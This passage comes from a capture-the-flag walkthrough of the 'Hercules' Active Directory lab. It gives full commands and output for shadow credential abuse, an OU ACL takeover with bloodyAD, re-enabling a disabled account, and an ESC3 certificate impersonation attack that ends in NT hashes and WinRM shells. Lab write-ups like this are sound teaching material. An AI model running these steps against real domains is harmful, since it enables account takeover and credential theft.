[*] Key Credential generated with DeviceID '92a0d209761f472c856f4f3ed9ef1359'
[*] Adding Key Credential with device ID '92a0d209761f472c856f4f3ed9ef1359' to the Key Credentials for 'auditor'
[*] Successfully added Key Credential with device ID '92a0d209761f472c856f4f3ed9ef1359' to the Key Credentials for 'auditor'
[*] Authenticating as 'auditor' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'auditor@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'auditor.ccache'
[*] Wrote credential cache to 'auditor.ccache'
[*] Trying to retrieve NT hash for 'auditor'
[*] Restoring the old Key Credentials for 'auditor'
[*] Successfully restored the old Key Credentials for 'auditor'
[*] NT hash for 'auditor': a9285c625af80519ad784729655ff325
```

It works, and I can use the resulting ticket to authenticate:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache netexec smb dc.hercules.htb --use-kcache 
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\auditor from ccache 
```

### Shell

I’ll need to have my `krb5.conf` file configured, which I can generate with `netexec smb DC.hercules.htb --generate-krb5-file krb5.conf` and copy to `/etc`.

`nmap` showed 5986 open, not 5985. This means I’ll need to use the TLS/SSL connection, which `evil-winrm-py` handles easily:

```rust
oxdf@hacky$ KRB5CCNAME=auditor.ccache evil-winrm-py -i dc.hercules.htb -k --ssl
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc.hercules.htb:5986' as 'auditor@HERCULES.HTB'
evil-winrm-py PS C:\Users\auditor\Documents>
```

And I finally get `user.txt`:

```
evil-winrm-py PS C:\Users\auditor\Desktop> cat user.txt
6fc59532************************
```

## Auth as fernando.r

### Enumeration

#### Filesystem

The auditor user’s home directory is very empty:

```sql
evil-winrm-py PS C:\Users\auditor> tree /f
Folder PATH listing
Volume serial number is 0A8A-BD1A
C:.
+---Desktop
¦       user.txt
¦       
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

There are a few other users on the host:

```sql
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/4/2024  11:37 AM                .NET v4.5
d-----         12/4/2024  11:37 AM                .NET v4.5 Classic
d-----        10/17/2025  10:28 PM                Admin
d-----         9/24/2025   3:41 AM                Administrator
d-----         12/4/2024  11:45 AM                ashley.b
d-----         12/4/2024  11:44 AM                auditor
d-----         9/23/2025   5:36 PM                natalie.a
d-r---         12/4/2024  11:26 AM                Public
```

Nothing too surprising in the drive root:

```sql
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/10/2025  12:56 AM                inetpub
d-----          5/8/2021   6:15 PM                PerfLogs
d-r---         9/24/2025   3:42 AM                Program Files
d-----         12/4/2024  11:44 AM                Program Files (x86)
d-----         12/4/2024  11:45 AM                Shares
d-r---        10/17/2025  10:28 PM                Users
d-----        10/10/2025  12:58 AM                Windows
```

`inetpub` has the web site, and also the `Reports` share, matching the `C:\inetpub\Reports\` upload path from the decompiled source. `Shares` has the other two custom SMB shares.

#### BloodHound

The original BloodHound collection shows nothing interesting for auditor. However, if I re-collect as auditor:

```rust
oxdf@hacky$ KRB5CCNAME=auditor.ccache rusthound-ce -d hercules.htb -f dc.hercules.htb -k --zip   

---------------------------------------------------
Initializing RustHound-CE at 14:18:59 on 09/17/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-17T14:18:59Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-17T14:18:59Z INFO  rusthound_ce] Collection method: All
[2026-09-17T14:18:59Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2026-09-17T14:18:59Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-09-17T14:18:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-17T14:18:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2026-09-17T14:18:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-17T14:19:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2026-09-17T14:19:00Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 2%                                                                                            [2026-09-17T14:19:01Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2026-09-17T14:19:01Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-09-17T14:19:01Z INFO  rusthound_ce::json::maker::common] .//20260917141901_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 14:19:01 on 09/17/26! Happy Graphing!
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The log reports “10 ous parsed!”, which is one more than the last time I ran [above](#ldap---tcp-389). The previous users did not have visibility into this OU, but auditor does. Now there’s a new outbound control from auditor:

![image-20260917104033925](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/32254330b42c9c27.png)

![image-20260917104033925](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260917104033925.webp)

There are two paths that jump out in BloodHound now:

![image-20260917174812376](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/be619f127f1b3c8a.png)

![image-20260917174812376](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260917174812376.webp)

### via IIS_Administrator \[Fail\]

#### Strategy

For the bottom path, I’ll use the fact that I have `GenericAll` on the OU to do a [Generic Descendant Object Takeover](https://bloodhound.specterops.io/resources/edges/generic-all#generic-descendant-object-takeover) attack. I will apply a `GenericAll` ACE to the OU and it will inherit down to the members of the OU.

Once I have `GenericAll` on IIS_Administrator, I will set a shadow credential on the account. That account is a member of Service Operators, which has `ForceChangePassword` on IIS_Webserver$, and that account has `AllowedToAct` on the DC.

#### Generic Descendant Object Takeover

I’ll use the `GenericAll` over the Forest Migration OU to add `GenericAll` for auditor over the OU using `bloodyAD`:

```
oxdf@hacky$ KRB5CCNAME=auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" auditor
[+] auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

With this, auditor should have `GenericAll` over all the objects in this OU. The obvious next step is to add a shadow credential to IIS_Administrator, but it fails:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow add -k -account iis_administrator -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'iis_administrator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'edf4904330bb4a438a6adfd8b5597307'
[*] Adding Key Credential with device ID 'edf4904330bb4a438a6adfd8b5597307' to the Key Credentials for 'iis_administrator'
[-] Could not update Key Credentials for 'iis_administrator' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

There are four other users in this OU:

![image-20260918164708430](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2d9c24120d6d976c.png)

![image-20260918164708430](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260918164708430.webp)

This technique works on other users in the OU. For example, anthony.r:

```typescript
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow add -k -account anthony.r -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'anthony.r'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f4dc59aca79742a3b02960c4934f81ae'
[*] Adding Key Credential with device ID 'f4dc59aca79742a3b02960c4934f81ae' to the Key Credentials for 'anthony.r'
[*] Successfully added Key Credential with device ID 'f4dc59aca79742a3b02960c4934f81ae' to the Key Credentials for 'anthony.r'
[*] Saving certificate and private key to 'anthony.r.pfx'
[*] Saved certificate and private key to 'anthony.r.pfx'
```

The problem is that the IIS_Administrator account is marked as an admin account (`adminCount=1`). This can be seen in BloodHound:

![image-20260918165907333](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/967d0ed23b5fa822.png)

![image-20260918165907333](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260918165907333.webp)

Whereas anthony.r is not:

![image-20260918165928297](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1a9117ba95798dae.png)

![image-20260918165928297](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260918165928297.webp)

A generic descendant object takeover through OU inheritance cannot touch a protected account. Without real access to IIS_Administrator, that path is a dead end.

### Target fernando.r

#### Strategy

The realistic path is to do the same attack to get control over fernando.r, who is a member of the Smartcard Operators group. That group can do an ESC3 attack on the domain. From there I’ll have to figure out which user to attack, and end up at ashley.b.

#### Generic Descendant Object Takeover

I’ll do the same thing as above, but this time targeting fernando.r. There are at least a couple different errors that can come up here.

There’s a bot cleaning up the ACLs on the OU, and if they go away, I’ll get this:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow auto -k -account fernando.r -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'fernando.r'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '945211238ed2449b8a15dd12ce173963'
[*] Adding Key Credential with device ID '945211238ed2449b8a15dd12ce173963' to the Key Credentials for 'fernando.r'
[-] Could not update Key Credentials for 'fernando.r' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

I can just re-run the `bloodyAD` command and then I get this:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow auto -k -account fernando.r -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'fernando.r'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'dfb77380594c4ce1a7ee3763929b0521'
[*] Adding Key Credential with device ID 'dfb77380594c4ce1a7ee3763929b0521' to the Key Credentials for 'fernando.r'
[*] Successfully added Key Credential with device ID 'dfb77380594c4ce1a7ee3763929b0521' to the Key Credentials for 'fernando.r'
[*] Authenticating as 'fernando.r' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'fernando.r@hercules.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
[*] Restoring the old Key Credentials for 'fernando.r'
[*] Successfully restored the old Key Credentials for 'fernando.r'
[*] NT hash for 'fernando.r': None
```

While fernando.r isn’t a protected account, it also isn’t enabled:

![image-20260918174751972](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7d3ad440d5021940.png)

![image-20260918174751972](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260918174751972.webp)

`bloodyAD` can enable the account:

```
oxdf@hacky$ KRB5CCNAME=auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac fernando.r -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
```

And now I can create the shadow credential:

```sql
oxdf@hacky$ KRB5CCNAME=auditor.ccache certipy shadow auto -k -account fernando.r -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'fernando.r'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '35cbc508fcad4dd5bc96bce2f57cff20'
[*] Adding Key Credential with device ID '35cbc508fcad4dd5bc96bce2f57cff20' to the Key Credentials for 'fernando.r'
[*] Successfully added Key Credential with device ID '35cbc508fcad4dd5bc96bce2f57cff20' to the Key Credentials for 'fernando.r'
[*] Authenticating as 'fernando.r' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'fernando.r@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'fernando.r.ccache'
[*] Wrote credential cache to 'fernando.r.ccache'
[*] Trying to retrieve NT hash for 'fernando.r'
[*] Restoring the old Key Credentials for 'fernando.r'
[*] Successfully restored the old Key Credentials for 'fernando.r'
[*] NT hash for 'fernando.r': e5ffd06fa27b1580198631558b564a61
```

```sql
oxdf@hacky$ KRB5CCNAME=fernando.r.ccache netexec smb dc.hercules.htb --use-kcache 
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\fernando.r from ccache
```

## Shell as ashley.b

### Enumeration

I already know that BloodHound shows ESC3 as a vector here. I’ll run `certipy` to look at the ADCS configuration:

```yaml
oxdf@hacky$ KRB5CCNAME=fernando.r.ccache certipy find -vulnerable -stdout -k -target dc.hercules.htb -dc-host dc.hercules.htb -ns 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

There are three vulnerable templates (`MachineEnrollmentAgent`, `EnrollmentAgentOffline`, and `EnrollmentAgent`) that all have the same pattern. The user I have auth as is in a group with enrollment rights. As an enrollment agent, members of these groups can request certificates on behalf of other users. The main limit on this is that I can’t request a certificate for a protected admin user, which limits my targets.

There are a bunch of users on this domain, and none of them have clear paths in BloodHound to domain admin. There is one additional user in the Remote Management Users group:

![image-20260918180152569](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/687dcd7dca46b04f.png)

![image-20260918180152569](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260918180152569.webp)

ashley.b also has a home directory on the box. Seems like as good a target as any.

### ESC3

The actual attack is very simple, as I’ve shown before in [HTB: Certificate](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html#esc3) (and indirectly in [HTB: TombWatcher](https://0xdf.gitlab.io/2025/10/11/htb-tombwatcher.html#exploit-scenario-b)). I’ll use `certipy` to request a certificate to act as an agent:

```kotlin
oxdf@hacky$ KRB5CCNAME=fernando.r.ccache certipy req -k -no-pass -u fernando.r@hercules.htb -target dc.hercules.htb -ns 10.129.242.196 -ca CA-HERCULES -template EnrollmentAgent
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

Now I’ll request a User certificate for ashley.b. Trying it over the same RPC channel fails with a COM error:

```kotlin
oxdf@hacky$ KRB5CCNAME=fernando.r.ccache certipy req -k -no-pass -u fernando.r@hercules.htb -target dc.hercules.htb -ns 10.129.242.196 -ca CA-HERCULES -template User -pfx fernando.r.pfx -on-behalf-of 'hercules\ashley.b' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80010117 - RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed.
Would you like to save the private key? (y/N): 
[-] Failed to request certificate
```

`-dcom` switches from the RPC endpoint to the DCOM one, and that works:

```kotlin
oxdf@hacky$ KRB5CCNAME=fernando.r.ccache certipy req -k -no-pass -u fernando.r@hercules.htb -target dc.hercules.htb -ns 10.129.242.196 -ca CA-HERCULES -template User -pfx fernando.r.pfx -on-behalf-of 'hercules\ashley.b' -dcom
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via DCOM
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

Now I’ll use that certificate to authenticate:

```css
oxdf@hacky$ certipy auth -pfx ashley.b.pfx -dc-ip 10.129.242.196
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

That provides a TGT for ashley.b.

### Shell

The TGT works with `evil-winrm-py` to get a shell as ashley.b:

```rust
oxdf@hacky$ KRB5CCNAME=ashley.b.ccache evil-winrm-py -k -i dc.hercules.htb --ssl
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc.hercules.htb:5986' as 'ashley.b@HERCULES.HTB'
evil-winrm-py PS C:\Users\ashley.b\Documents>
```

## Auth as IIS_Administrator

### Enumeration

ashley.b’s home directory has three files in it:

```sql
evil-winrm-py PS C:\Users\ashley.b> tree /f
Folder PATH listing
Volume serial number is 0A8A-BD1A
C:.
+---Desktop
¦   ¦   aCleanup.ps1
¦   ¦   
¦   +---Mail
¦           RE_ashley.eml
¦           
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Scripts
¦       cleanup.ps1
¦       
+---Videos
```

`aCleanup.ps1` is the script from the `.lnk` file in the share above. It is very short, just running a scheduled task:

```powershell
Start-ScheduledTask -TaskName "Password Cleanup"
```

This task runs a script in the Administrator’s `AppData` directory:

```
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "Password Cleanup").Actions | Format-List *

Id                    : 
Arguments             : -File "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
Execute               : powershell.exe
WorkingDirectory      : 
PSComputerName        : 
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_TaskExecAction
CimInstanceProperties : {Id, Arguments, Execute, WorkingDirectory}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
```

It runs as SYSTEM:

```yaml
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "Password Cleanup").Principal | Format-List *

RunLevel              : Limited
LogonType             : ServiceAccount
ProcessTokenSidType   : Default
DisplayName           : 
GroupId               : 
Id                    : Author
UserId                : SYSTEM
RequiredPrivilege     : 
PSComputerName        : 
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_TaskPrincipal2
CimInstanceProperties : {DisplayName, GroupId, Id, LogonType...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
```

`cleanup.ps1` is likely related or potentially even a copy of that script:

```powershell
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            }
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
